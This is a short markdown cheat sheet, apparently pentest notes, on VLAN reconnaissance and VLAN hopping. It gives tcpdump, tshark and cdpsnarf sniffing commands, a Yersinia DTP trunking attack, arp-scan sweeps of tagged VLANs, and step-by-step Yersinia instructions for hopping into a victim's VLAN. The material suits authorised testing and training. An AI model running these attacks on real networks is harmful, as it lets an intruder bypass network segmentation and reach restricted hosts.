# Vlan Attacking
Cisco’s definition of Virtual Local Area Network (VLAN)
"A VLAN is a group of devices on one or more LANs that are configured to communicate as if they were attached to the same wire, when in fact they are
located on a number of different LAN segments. Because VLANs are based on logical instead of physical connections, they are extremely flexible"

# Basic Congiguration
```
ip link
​ifconfig eth1 up
modprobe 8021q To Load 802.1Q modules by defult 802.1Q is diable
```
**to view the traffic on eth1 interface. This command defines the interface and XX denotes parsing and printing the packet details**
```
tcpdump -i eth1 -XX -e 
```
**to capture packets starting at byte 20, and have a byte value of hex 2000**
```
​tcpdump -nn -v -i eth1 -s 1500 -XX -c 1 'ether[20:2] == 0x2000' 
tshark -a duration:30 -i eth1 -Y "cdp" -V 2>&1 #Alternatively, you can also use tshark or cdpsnarf to perform this same step:
```
**To capture VLAN IDs, we need to look for VLAN tagged packets that will contain VLAN information**
```
​cdpsnarf -i eth1
tshark -a duration:30 -i eth1 -Y "vlan" -x -V 2>&1 | grep -o " =ID: .*"  
```

Now we know about the presence of other VLANs on the network, we will attempt a VLAN hopping attackusing 
Yersinia to send DTP packets to negotiate with the switch port and at the same time 2) sending tagged packets in order tocommunicate with any hosts in the target VLAN
```
yersinia dtp -attack 1 -interface eth1

​arp-scan -Q ​10​ -I eth1 10.10.​10​.0/24 #Start arp scanning in another window
arp-scan -Q ​20​ -I eth1 10.10.​20​.0/24 #Start arp scanning in another window
​arp-scan -Q ​50​ -I eth1 10.10.​50​.0/24 #Start arp scanning in another window
```


# VLAN Hopping  and Double Tagging
VLAN Hopping is an exploitation method used to attack a network with multiple VLANs to bypass the restriction Network.typicaly Vlan restrict you to access to other vlan whice is inaccessible Network by. VLAN Hopping attacks are primarily conducted within the Dynamic Trunking Protocol. The following step are required to perform VLAN Hopping attack.
```
1. Start Yersinia via the command line by typing: yersinia -I. 
2. Select a NIC you wish to use by pressing “i”. 
3. Set Yersinia to trunking mode: 
a. Load DTP mode by pressing the “g” key, then select DTP mode. 
b. Press the “x” button to open the attacks menu. 
c. Press “1” to enable trunking mode. 
4. Set Yersinia to 802.1q mode by pressing the “g” key and selecting 802.1Q mode. 
5. The following needs to be obtained via reconnaissance for this attack to work: 
a. Victim's VLAN 
b. Victim's gateway IP Address. 
c. A host in the victim's network segment that is not alive. 
```
